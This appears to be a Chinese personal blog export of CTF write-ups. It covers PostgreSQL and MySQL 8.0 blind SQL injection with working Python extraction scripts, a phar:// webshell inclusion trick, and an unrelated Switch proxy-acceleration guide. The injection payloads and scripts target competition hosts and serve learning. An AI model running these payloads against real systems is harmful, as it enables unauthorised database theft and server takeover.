    location <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
</span></code></pre>
<p>不过不是很想的通为什么bot要这么访问出来，我一开始直接初始化一个localStorage然后来一个链接让bot访问一个链接，不就没这个事了？</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.lmxspace.com/2019/02/16/ReDOS%E5%88%9D%E6%8E%A2/">ReDOS初探</a><br><a href="https://zhuanlan.zhihu.com/p/46294360">一个由正则表达式引发的血案</a><br><a href="https://liotree.github.io/2020/07/13/TSG-CTF%E5%A4%8D%E7%8E%B0/index.html">TSG-CTF复现</a><br><a href="https://yanluow.github.io/2021/02/04/justCTF2020%E9%A2%98%E7%9B%AEComputeration%E5%88%86%E6%9E%90/">Computeration的wp</a><br><a href="https://hackmd.io/@terjanq/justCTF2020-writeups">justCTF2020出题人wp</a><br><a href="https://m.yisu.com/zixun/133254.html">PHP中ob缓存的应用</a><br><a href="https://www.jianshu.com/p/43ff69d076e3">JS跨域–window.name</a><br><a href="https://blog.brycec.me/posts/justctf2020_writeups/">justCTF2020wp</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>XSS</tag>
        <tag>Golang</tag>
        <tag>ReDoS</tag>
      </tags>
  </entry>
  <entry>
    <title>postgresql入门</title>
    <url>/postgresql%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h1 id="postgresql入门"><a href="#postgresql入门" class="headerlink" title="postgresql入门"></a>postgresql入门</h1><p>诡异的数据库，和MySQL和SQLite差距巨大，不会用。。。临时入门</p>
<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>用apt装下来pgsql之后，在root下键入psql会报如下错误， <code>FATAL:  role &quot;root&quot; does not exist</code>。后来发现是安装pgsql的时候会在当前机器上创建一个名为postgres的用户，可以su切换过去就能跑通了。也可以直接改<code>/etc/postgresql/9.x/main/pg_hba.conf</code>里面的内容，直接给postgres这个号改成trust然后用systemctl重启一下，就能直接<code>psql -U postgres</code>进数据库了</p>
<h2 id="简单终端交互"><a href="#简单终端交互" class="headerlink" title="简单终端交互"></a>简单终端交互</h2><p><code>\l</code>显示所有数据<br><code>\c &lt;dbname&gt;</code>切换数据库<br><code>\d</code>显示当前数据库下的表<br><code>\q</code>退出<br>这几个命令和MySQL差距好大，临时学一下。。</p>
<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>pgsql的语法细节和mysql之间也有巨大的不同，简单的就比如||实际上是字符串拼接，可以<code>SELECT * FROM users WHERE username=&#39;admi&#39;||&#39;n&#39;</code></p>
<p>pgsql中将双引号和反引号包裹的内容视为列名，所以字段得用单引号包裹</p>
<pre><code>test=# select * from users where username=&quot;admin&quot;;
ERROR:  column &quot;admin&quot; does not exist
</code></pre>
<p>MySQL中只有反引号是这个效果，印象里有一次比赛是堆叠注入修改MySQL配置，把||从OR逻辑改成了字符串拼接符号</p>
<h2 id="题"><a href="#题" class="headerlink" title="题"></a>题</h2><p>DASCTF和BUU联动比赛的一个题，时间刚好撞上XCTF final，神仙们都去打XCTF final了，进不了XCTF final的垃圾开始自嗨<br>一开始本地没有pgsql的环境，payload就盲打也不知道跑不跑得通，网上看的二手文章后来本地搭起来环境之后根本跑不通，看一眼时间还是去年年底发的，国内一堆中文翻译版本。不经让我想起zsx神仙的一句话</p>
<blockquote>
<p>珍爱生命，远离二手文章</p>
</blockquote>
<p>好像题目还叫checkin，反正最后没人做出来，实际上测的时候没搭本地环境搞不清楚怎么回事，后来本地环境一起就直接搞定了。。。去掉顶尖神仙之后剩下来的战斗力这么不堪吗</p>
<p>pgsql注入的时候有几个新的关键字，以及一些奇怪的强类型判断，MySQL应该算是会进行弱类型转换的，or语句直接接数字字符串之类的都会直接转换成true，pgsql就会反手一个<br><code>ERROR:  argument of OR must be type boolean, not type void</code>，导致我sleep一下测试都测试不动<br>但是可以通过字符串拼接执行sleep，可能是允许字符串拼一个空上去吧</p>
<p>从二手文章里抄来的payload<br><code>SELECT username FROM users WHERE username = &#39;&#39;||(SELECT &#39;z33&#39;);</code><br>马上报错<code>ERROR:  failed to find conversion function from unknown to text</code><br>从这里感觉pgsql也存在一些最基础的默认类型转换，比如void转换成字符串是空字符串之类的，但是直接select出来的结果并不能直接变成字符串？</p>
<p>类型转换一下就可以了，类型转换有两种方法，一个是直接在后面加两冒号接类型<br><code>SELECT username FROM users WHERE username = &#39;&#39;||(SELECT &#39;z33&#39;)::text;</code><br>还有一种是使用cast函数<br><code>SELECT username FROM users WHERE username = &#39;&#39;||cast((SELECT &#39;Penelope&#39;) as text);</code><br>解决了pgsql的类型问题之后注入就变得很简单了</p>
<p>这里还是继续套用魔改二手文章的payload<br><code>select * from users where username=&#39;&#39;||(select case when(cast((select count((select password from users where password similar to &#39;test_pass%&#39;)))as text)) not like &#39;0&#39; then pg_sleep(2) else &#39;&#39; end);</code><br>因为没有回显只能时间盲注了，使用||进行字符串拼接，<code>select case when condition then xxx else xxx end</code>条件语句，similar to关键字类似于MySQL的regexp，使用正则进行匹配，count数查询出来的结果，判断条件填<code>not like &#39;0&#39;</code>，true就sleep 2s，否则是空字符串。从之前可知void可以直接和字符串拼接，不用类型转换<br>但是这里禁用了<code>&lt;&gt;=</code>这几个比较符号，因为count的返回值是数字，原payload使用的是<code>&lt;&gt;0</code>不等于0，本来想直接用not like绕过，后来本地测试才发现like只能进行字符串之间的比较，所以还套了一层cast把count结果转换到字符串打通</p>
<h3 id="pgsql的正则匹配"><a href="#pgsql的正则匹配" class="headerlink" title="pgsql的正则匹配"></a>pgsql的正则匹配</h3><p>这里关键考虑一下这个similar to关键字，这个玩意的正则匹配有点邪乎，使用了半像半不像的正则规则，基本上的正则语法都支持，但是原来的<code>.</code>在这里是下划线<code>_</code>，原来的<code>*</code>在这里是百分号<code>%</code>。。。</p>
<p>虽然单独拿出来用的时候好像并没有什么问题，但是在上面那个payload在没有<code>%</code>的时候似乎不能表现出正则的效果，比如<br><code>select * from users where username=&#39;&#39;||(select case when(cast((select count((select password from users where password similar to &#39;admi_&#39;)))as text)) not like &#39;0&#39; then pg_sleep(2) else &#39;&#39; end);</code><br>就不会sleep，但实际上我有一个内容为admin的密码，改为<br><code>select * from users where username=&#39;&#39;||(select case when(cast((select count((select password from users where password similar to &#39;admi_%&#39;)))as text)) not like &#39;0&#39; then pg_sleep(2) else &#39;&#39; end);</code><br>后成功sleep</p>
<p>官方文档中有提到LIKE也能正则</p>
<blockquote>
<p>如果pattern不包含百分号或者下划线，那么该模式只代表它本身； 这时候LIKE的行为就像等号操作符。在pattern 里的下划线(_)匹配任何单个字符；而一个百分号(%) 匹配零或多个任何序列。</p>
</blockquote>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>垃圾脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://6003f037-5d85-4e89-94b5-02781319ebdb.node3.buuoj.cn/"</span>

charset <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"</span><span class="token punctuation">)</span>

result <span class="token operator">=</span> <span class="token string">'w3Lc0me_t0_DA5CTF_June'</span>
<span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"'||(selselectect case when(cast((selselectect count((selselectect password from users where password similar to '{}{}%')))as text)) not like '0' then pg_sleep(2) else '' end)--"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'/**/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>result<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"pwd"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">}</span>
        <span class="token comment" spellcheck="true"># print(data)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            flag <span class="token operator">=</span> <span class="token boolean">False</span>
            result <span class="token operator">+=</span> i
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

len <span class="token operator">=</span> <span class="token number">22</span>
<span class="token comment" spellcheck="true"># 反过来测一下字段长度</span>
<span class="token comment" spellcheck="true"># for i in range(40, 0, -1):</span>
<span class="token comment" spellcheck="true">#     data = {</span>
<span class="token comment" spellcheck="true">#         "username": "'||(selselectect case when(cast((selselectect count((selselectect password from users where password similar to '{}%')))as text)) not like '0' then pg_sleep(2) else '' end)--".replace(</span>
<span class="token comment" spellcheck="true">#             ' ', '/**/').format('_'*i), "pwd": "123"}</span>
<span class="token comment" spellcheck="true">#     time.sleep(0.2)</span>
<span class="token comment" spellcheck="true">#     start_time = time.time()</span>
<span class="token comment" spellcheck="true">#     res = requests.post(url, data)</span>
<span class="token comment" spellcheck="true">#     if time.time() - start_time > 2:</span>
<span class="token comment" spellcheck="true">#         print(i)</span>
<span class="token comment" spellcheck="true">#         break</span>
</code></pre>
<p>这里有几个坑点，因为下划线是pgsql的正则通配符（还有好多字符比如+什么的），所以盲注的时候这个常用字符就从charset里剔除了，后来发现只能注到welcome，然后反过来用下划线测了一下字段长度，发现有22位长。</p>
<p>然后想试试转义掉下划线再测看能不能试出来，然后发现题目把转义ban了。<br>最后用<code>[Z-^]</code>这种操作测范围一点点试出来确实是下划线（按常理应该也是这个东西。。。）<br>然后注不动手动加下划线注出密码登录</p>
<p>然后是一个文件包含加上传，过滤了base，file协议和几个基本的操作<br>先用string.rot13翻转一手把源码读出来，文件上传就限定了后缀，同时检查了不能带有<code>&lt;?</code>，但是并不校验文件格式。文件包含补了后缀.php，没有拼接目录<br>可以整个phar解压缩包含，写个shell.php压缩成zip，改名jpg上传，然后<code>phar://path/shell.jpg/shell</code>包含打通</p>
<p>拿到shell之后去看了一下有一个不给读的文件的源码，发现了一个针对SQLmap的过滤。我猜这个题是颖奇出的，那个时候才想起来嘶吼CTF有一万个SQL注入都是他出的，其中就有一个pgsql，那个时候好像就已经学了pgsql的憨批类型转换了，但是现在又忘了，然后当时那个题就是有人SQLmap一把梭非预期过</p>
<p>再抄一份当时颖奇的payload<br><code>&quot;0&#39;and(select/**/case/**/when(substr((select/**/password/**/from/**/users/**/where/**/username=&#39;admin&#39;),&#123;i&#125;,1)=&#39;&#123;char&#125;&#39;)then(select/**/&#39;roarctf&#39;/**/from/**/pg_sleep(3))else/**/&#39;1&#39;/**/end)=&#39;roarctf&#39;--</code></p>
<p>感觉也差不多吧，这里用了and所以后面的结果得是个bool值，所以用等于号做了个判断<br>不过不是很懂then里面为什么不直接sleep而是select了一下</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/8621">虽然有点毛病但是还是挺实用的二手文章</a><br><a href="http://www.postgres.cn/docs/9.4/functions-matching.html">pgsql模式匹配官方文档</a><br><a href="https://www.gem-love.com/ctf/2702.html">颖奇嘶吼wp</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnhub7月公开赛</title>
    <url>/pwnhub7%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B.html</url>
    <content><![CDATA[<h1 id="pwnhub7月公开赛"><a href="#pwnhub7月公开赛" class="headerlink" title="pwnhub7月公开赛"></a>pwnhub7月公开赛</h1><p>由于长时间的逃避SQL注入导致我现在又是一个SQL注入废物，以前做过的东西也记不清了</p>
<h2 id="newsql"><a href="#newsql" class="headerlink" title="newsql"></a>newsql</h2><p>提示使用SQL8.0的新操作</p>
<p>简单测一下发现有报错，过滤的比较关键的东西有select，去掉这个战斗力减少100%，给了报错但是extractvalue之类的函数也没了，sleep也没了，不过很明显的登录成功时状态码200，失败时状态码500。<br>出题人似乎还想用登录成功就直接重定向到home的界面来迷惑我，但是好像有点太直接了，反手一个python发包搞定<br>以前应该是做过SQL8.0的题目的，一时间想不起来了，后来翻了半天发现是去年年底的嘶吼SQL大礼包里面有一个8.0的table语句加行比较操作进行注入，这么一来就简单了。既然是学过的东西复现一下就能搞定，把嘶吼的垃圾脚本翻出来改改，慢悠悠的注就行<br>嘶吼的wp<br><a href="/%5BRoarCTF2020%5Dwp.html">RoarCTF2020wp</a><br>再补一个mysql8.0的操作<br><a href="https://www.anquanke.com/post/id/231627">MySQL8.0绕过手段</a></p>
<p>注出来的flag不知道是不是真flag。。。长得有点诡异，然后反过来去注用户，确实有第二个用户，不过登录了一下发现好像也没什么变化，就拉倒了</p>
<p>附上垃圾脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

<span class="token comment" spellcheck="true"># 空格 # = > like union select database () sleep extractvalue</span>
url <span class="token operator">=</span> <span class="token string">"http://47.99.38.177:10084/"</span>
charset <span class="token operator">=</span> <span class="token string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz}`"</span>

db_name <span class="token operator">=</span> <span class="token string">"ctf"</span>  <span class="token comment" spellcheck="true"># mysql information_schema performand sys ctf</span>
table_name <span class="token operator">=</span> <span class="token string">"f1aggghere"</span>  <span class="token comment" spellcheck="true"># f1aggghere      users</span>
column_name <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment" spellcheck="true"># ID FLAG 2列    id username password 三列</span>
content <span class="token operator">=</span> <span class="token string">""</span>        <span class="token comment" spellcheck="true"># TH1S1STHEFL0GGGTH0TY0UA1WAYSW0NT         1 admin admin123    2 whoami whoami369</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># for c in charset:</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># 当前字符相等时比较下一位，故仍是小于，需大于时才能确定，故下面需要-1，表名ctf排第一，所以直接以表名排序</span>
        <span class="token comment" spellcheck="true"># payload = "123' or ('def','{}','',4,5,6)&lt;(table information_schema.schemata limit 4,1)#".replace(' ', '/**/').format(db_name + c)</span>
        <span class="token comment" spellcheck="true"># payload = "123' or ('def','{}','{}','',5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1)&lt;(table information_schema.tables order by table_schema limit 1,1)#".replace(' ', '/**/').format(db_name, table_name + c)</span>
        <span class="token comment" spellcheck="true"># payload = "123' or ('def','{}','{}','{}','',6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2)&lt;(table information_schema.columns order by table_schema limit 2,1)#".replace(' ', '/**/').format(db_name, table_name, column_name + c)</span>
        payload <span class="token operator">=</span> <span class="token string">"123' or (1, 0x{})&lt;(table {} limit 0,1)#"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'/**/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>content <span class="token operator">+</span> <span class="token string">"{:02X}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> table_name<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(res.text)</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
            content <span class="token operator">+=</span> <span class="token string">"{:02X}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token number">-1</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre>
<p>使用垃圾脚本的时候还是踩了一两个坑，table_schema是库名，就6列，table_name表名，21列，columns_name列名，22列。实际上列名没什么用，到时候猜一下有几列都行，反正给了报错<br>当注入对比的是行的最后一个字段时，最后一位跑出来的结果应当+1，因为之前的都给我减了个1，如果不是最后一个字段的话就简单的令下一个字段为空字符串，小于一切<br>第一列稳定是’def’，第二列就是库名，第三列表名，第四列列名，边注入记得边更新，然后还可以使用对库名排序的方式来快速定位到表的字段位置，列名没什么用。不如不注节约时间<br>注数据的时候如果第一列是ID，用字符也没什么问题，反正弱类型数字1和字符1也相等</p>
<p>最后注flag时用的16进制能区分大小写，<code>&quot;&#123;:02X&#125;&quot;.format(c)</code>是我学的全新操作，快速做到十进制十六进制转换，强有力且方便<br>嘶吼的wp中我有提到用binary区分大小写，但是后来发现那是只有一列的时候才能用的操作，那次刚好flag就一列所以能用</p>
<h3 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h3><p>以上是交给pwnhub的wp，现在我有一点简单的吐槽。<br>首先是这个必须交wp才能交flag这个操作，着实有点坑，搞得我一开始注出来这个奇怪的东西也不知道对不对，还去把users表也打了一遍<br>其次是flag我为了区分大小写还专门把payload换成了16进制，注出来的flag是全大写的，最后交了好几次发现flag其实是小写的，这个是真的坑嗷</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select ('1', 0x60)<(1,'A');
+---------------------+
| ('1', 0x60)<(1,'A') |
+---------------------+
|                   0 |
+---------------------+
1 row in set (0.00 sec)

mysql> select ('1', 0x60)<(1,'a');
+---------------------+
| ('1', 0x60)<(1,'a') |
+---------------------+
|                   1 |
+---------------------+
1 row in set (0.00 sec)
</code></pre>
<p>再次，flag还要套上flag，但是并没有什么说明文档说明这一点，交flag的时候感觉自己像个小丑在一点点猜</p>
<h2 id="PyPrint"><a href="#PyPrint" class="headerlink" title="PyPrint"></a>PyPrint</h2><p>这个题能传一个python脚本上去然后给你运行一下输出结果，题目是这么写的，然后题目会告诉你他只认print和#，但事实上我的测试结果是他只认#，其他的咋输入都会报错只认得print和#。。。。<br>然后无论是报错还是只有#执行成功，输出都会把以#开头的一行去掉。但说实话，还有一个功能我都不知道该怎么用，已经给我看傻了。这个题目有点奇怪</p>
<p>咕了，事情还没做完呢</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title>Switch自建加速终章</title>
    <url>/switch%E5%8A%A0%E9%80%9F%E6%9C%80%E5%90%8E%E4%B8%80%E7%89%88.html</url>
    <content><![CDATA[<h1 id="Switch自建加速终章"><a href="#Switch自建加速终章" class="headerlink" title="Switch自建加速终章"></a>Switch自建加速终章</h1><p>短时间内不会再研究这个东西了，到最后感觉还是竹篮打水一场空。。。但是发现之前写的东西似乎有一点问题，订正一下然后最后总结一下这几天都干了什么奇怪的事情</p>
<h2 id="2022-2-12-update"><a href="#2022-2-12-update" class="headerlink" title="2022.2.12 update"></a>2022.2.12 update</h2><p>写在前面<br>套娃操作实际意义不大，起码我目前从未见识过所谓的UDP断流等情形，switch联机的P2P性质使得游戏体验在理论上由几个因素决定：1.NAT类型，NAT类型决定了联机进入房间的成功率，NAT到A只要丢包不严重你就是人上人；2.出口点之间的网络环境，比如你开个加速器飞去美国，然后国内裸连卡比就等于是从国内连你，还是卡，但是你们俩都飞美国或者都在国内，可能就很顺畅了。比如我和我大哥直接校园网畅快联机。。。3.网络链路质量，正常人一般使用的都是家用网络，总是能在网上看到说这个机房去程xx线路回程xx线路的。如果是很好的线路应该就不用考虑丢包延迟问题了，因此自建时服务器所使用的链路应该影响也很大。<br>还是推荐一下后来更新的较稳定方案<br>且该套娃方案可能由于工具本身的问题，会导致NAT类型的退化，不建议用于Switch P2P联机加速，反而可能对某些PC端CS类型游戏有效<br><a href="https://blog.z3ratu1.cn/Switch%E8%87%AA%E5%BB%BANAT%E4%BC%98%E5%8C%96%E6%8C%87%E5%8C%97.html">Switch自建NAT优化指北</a></p>
<p>—————原文章内容分割线————–</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>想要获得直接的加速体验请直接出门左拐UU&#x2F;灵缇</strong>，本教程并不能保证获得更好的游戏体验，完全只是出于兴趣成功搭建起了一个奇怪的代理<br>复习一下之前说过的东西，因为任天堂不提供游戏服务器，无论是动森还是MH这些游戏，虽然说是房主当Server，但是实质上还是类似P2P，反正都是玩家之间互相联机，所以和绝大多数PC网游的加速流程有略微的区别。<br>NAT类型只决定两个玩家之间的网络可达性，当两个玩家之间达到了可达的最低要求成功联机之后，联机的体验取决于两个玩家之间网络链路的延时情况，服务质量，丢包情况等。主要的影响因素有UDP本身的不可靠性，互联网运营商对在网络拥塞时对UDP的断流（好像在南京没遇到过，晚上网络高峰也不怎么丢，但是我家里小县城好像有点严重），电信联通移动运营商之间互相卡脖子，出网误伤等。<br>自建服务器顶多使得NAT类型从垃圾校园网的C,D提升到B（能用就行）并不能太多的改善网络通路情况，并且真的好麻烦。。。网络垃圾学了好久才搞懂，如果是不怎么使用计算机的小白想搞定就更麻烦了，总的来说，完全不值得，我完全是出于一种奇怪的兴趣而在这个上面花费了这么多时间。</p>
<p>最直接的解决方案，UU，灵缇一键搞定（<del>结一下这个月的广告费谢谢</del>），他们都是搭的专线并且软件订制稳定靠谱，自建时需要的服务器也是一笔开支，如果是就着机场的节点可能会由于机场自身的限制NAT-type变得更为拉跨，如果是自己买的vps地区和好友开的加速器节点位置诡异也会异常的尴尬<br>比如我其实是用阿里云的上海VPS加速，还没试过和各地联机效果（理论上应该是国内联机效果应该比较好，然后就算是好友开外国节点上海出网应该也还能用？）</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="clash网关接管失败"><a href="#clash网关接管失败" class="headerlink" title="clash网关接管失败"></a>clash网关接管失败</h3><p>之前通过PC和Switch连入同一个WiFi，再将Switch手动把网关设置到PC，clash开启ServiceMode接管所有网卡流量，可以做到对Switch的全局流量接管转发UDP。<strong>但是</strong>，一个寒假回来忘记之前的操作是怎么做的了，现在Switch连接同一个WiFi设置网关为PC会报错DNS解析失败，连不上去。wireshark抓包完全没看到Switch和PC的通信，不知道是哪里出问题了呜呜。</p>
<h3 id="超简易NAT-type提升方案"><a href="#超简易NAT-type提升方案" class="headerlink" title="超简易NAT-type提升方案"></a>超简易NAT-type提升方案</h3><p><strong>但是</strong>，clash经过几次更新似乎在某个版本修复了同时启动TUN模式和热点会导致出现网络回环原地爆炸的问题，现在可以在启动TUN模式的同时开一个热点，去网络适配器选项里面选中Clash网卡，选中”共享”选项，共享的网卡填开出来热点的那块网卡，Switch连热点同样能做到全局流量接管，在vps上配一个酸酸乳（后面优化要用），clash里面自己写个节点进去连上，NAT类型成功从校园网锁定的C或D提升至B（但是上下行流量速度并不怎么样，5M小水管是这样的，能用就行.jpg），用机场的节点NAT类型变成了F。。。所以还是自己的机子靠谱，机场不知道上了什么限制</p>
<p>至此，NAT类型到B就起码拥有呼吸权了，接下来就想办法看看怎么优化一下流畅程度什么的？</p>
<h3 id="why-SSR"><a href="#why-SSR" class="headerlink" title="why SSR?"></a>why SSR?</h3><p>理论上v2ray和Trojan都能套这个，出云巨佬和我说过这事但是那个时候的我什么都不懂嘻嘻，所以就没学，好像说v2怎么个反正就是不适用？要套就套Trojan，不过好像酸酸乳比较古老比较成熟，网上教程也一搜一把，并且也没钱买路由器刷固件搞Trojan，进入拉倒状态。本身机子就在国内，酸酸乳也不出墙，应该不会被封吧呜呜<br>然后就是这个用酸酸乳能减轻VPS本身位于国外时的出口干扰（虽然我的VPS在国内所以好像没什么意义。。。直接用Socks5好像也行）</p>
<h3 id="udp2raw-udpspeeder"><a href="#udp2raw-udpspeeder" class="headerlink" title="udp2raw+udpspeeder"></a>udp2raw+udpspeeder</h3><p>理论上是用来防止运营商断流和改善UDP的不可靠性两个工具，配置起来也不难，就是不知道是不是真的有用<br>udp2raw将udp流量伪装成tcp流量，目的是阻止运营商断UDP的流，需要一个客户端一个服务端，客户端加密流量服务端解密流量，服务端出去的还不是UDP，只能说防的是地方运营商<del>但是配出来之后感觉并没有得到什么改善，可能南京这边比较靠谱</del><br>udpspeeder通过发送冗余流量降低丢包率，网络拥塞时丢失的包能够通过冗余包恢复，具体情况可以去GitHub上看作者写的解释。同样一个客户端一个服务端，客户端发冗余服务端解冗余，所以客户端和服务端需要进行套娃</p>
<p>安装步骤简单的不行，都是编译好的二进制文件，所谓的开箱即用<br>套娃命令如下<br>服务端</p>
<pre class=" language-shell"><code class="language-shell">./speederv2_amd64 -s -l127.0.0.1:port  -r127.0.0.1:ssr_port --mode 0 -f4:2 --timeout 1
./udp2raw_amd64 -s -l0.0.0.0:server_port -r127.0.0.1:port -k "passwd" --raw-mode faketcp -a
</code></pre>
<p>客户端</p>
<pre class=" language-shell"><code class="language-shell">speederv2.exe -c -l0.0.0.0:client_port -r127.0.0.1:port --mode 0 -f4:2 --timeout 1
udp2raw_mp.exe -c -l127.0.0.1:port -rserverip:service_port -k "passwd" --raw-mode faketcp
</code></pre>
<p>因为两个工具都是同一个大哥写的，所以参数含义都一样<br>简要说一下参数<code>-s</code>标记自身为服务端，<code>-c</code>标记自身为客户端，<code>-l</code>提供一个监听的ip:port，<code>-r</code>把自己处理的数据转发到指定的ip:port<br>udpspeeder的<code>-f</code>参数指定冗余情况，4:2就是指每四个包冗余两个，冗余越多丢包率越低，10:5的冗余是一样的，但是消耗的CPU会多，但是4:2的话6个包发一次又有点频繁，总之就是自己看网络情况决定了，udp2raw的<code>-k</code>参数指定加密密钥，好像没有什么安全性要求。。。这两个参数客户端和服务端要一致</p>
<p>再套一个端口映射服务，具体可以看文末参考链接</p>
<h4 id="套娃过程"><a href="#套娃过程" class="headerlink" title="套娃过程"></a>套娃过程</h4><p>客户端启动SSR客户端（可以是clash，sstap之类能接管全流量且支持酸酸乳的任意软件），把代理设置为本地的<code>client_port</code>，udpspeeder监听<code>client_port</code>，把收到的酸酸乳加密流量变成冗余过的udp流量发到<code>port</code>，udp2raw监听的也就是<code>port</code>，所以冗余过的流量就传给了udp2raw，udp2raw再把伪造成tcp的流量发到远端vps的<code>server_port</code><br>vps上反过来，先是udp2raw接收到我们本地发过来的伪造tcp流量，解回udp之后转发到自己的<code>port</code>上，而udpspeeder监听本地的<code>port</code>，拿到还原回来的冗余流量，处理出来之后转发到本地的<code>ssr_port</code>，发到我们的酸酸乳服务端，酸酸乳服务端再解密转发出去完成代理<br>整个就是 酸酸乳客户端-&gt;udpspeeder客户端-&gt;udp2raw客户端-&gt;udp2raw服务端-&gt;udpspeeder服务端-&gt;酸酸乳服务端</p>
<h4 id="小bug"><a href="#小bug" class="headerlink" title="小bug"></a>小bug</h4><p>udp2raw客户端跑不起来，报如下错，搜了一下，说是npcap没装（事实上我之前装nmap还是啥的时候就装了1.0版本的，后来换了一个1.2的重装一下就成了)</p>
<pre class=" language-shell"><code class="language-shell">[INFO]avaliable deives(device name: ip address ; description):
[FATAL]no matched device found for ip: [10.203.240.119]
</code></pre>
<p>使用套娃方式需要代理目的地位于本机，clash又会出现TUN模式下的流量回环，上行流量爆炸且CPU跑满只能任务管理器退掉</p>
<h4 id="SSTap-test"><a href="#SSTap-test" class="headerlink" title="SSTap test"></a>SSTap test</h4><p>使用替代品SSTap做实验ing</p>
<p>SSTap在选择全局流量转发时也会进入回环状态上行流量爆炸且CPU跑满，如果不开全局，随便选一个其他规则就能正常三重套娃，但是偶尔UDP转发不能过，有时候又能过，反复在本地重启套娃服务偶尔能成（未找到具体原因）</p>
